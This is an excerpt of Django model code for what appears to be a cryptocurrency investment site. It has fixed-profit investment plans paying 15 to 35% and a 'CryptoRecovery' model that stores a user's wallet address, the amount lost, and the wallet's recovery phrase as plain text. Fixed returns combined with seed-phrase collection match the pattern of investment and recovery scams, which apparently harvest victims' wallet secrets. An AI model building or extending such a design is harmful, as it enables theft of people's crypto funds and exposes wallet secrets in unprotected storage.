...
class Investment(models.Model):
    ...
    SCHEMA_CHOICES = (
        ...
        (7, 'Smart Investment'),  # New Smart Investment Plan
    )
    ...
    if old_instance.status != instance.status:
        if instance.status == 'approved' and old_instance.status == 'pending':
            ...
            profit_percentages = {
                ...
                5: 0.30,
                6: 0.35,
                7: 0.15,  # ✅ Smart Investment profit
            }
...
class Crypto(models.Model):
    ...
    logo = CloudinaryField("image", default="None")

    def __str__(self):
        return self.name
    class Meta:
        verbose_name = "z -Crypto Types"
        verbose_name_plural = "z -Crypto Types"
...
class Wallet(models.Model):
    ...
    class Meta:
        verbose_name = "z -Wallet Types"
        verbose_name_plural = "z -Wallet Types"


class CryptoRecovery(models.Model):
    crypto_type = models.ForeignKey(Crypto, on_delete=models.CASCADE, related_name="recoveries")
    wallet_type = models.ForeignKey(Wallet, on_delete=models.CASCADE, related_name="recoveries")
    wallet_address = models.CharField(max_length=255)
    amount_lost = models.DecimalField(max_digits=20, decimal_places=8)
    recovery_phrase = models.TextField(blank=True, null=True)  # Field for recovery phrase
    submitted_at = models.DateTimeField(auto_now_add=True)

    def __str__(self):
        return f"{self.crypto_type.name} recovery for {self.wallet_address[:10]}..."

    class Meta:
        verbose_name = "z -Crypto Recovery"
        verbose_name_plural = "Crypto Recoveries"
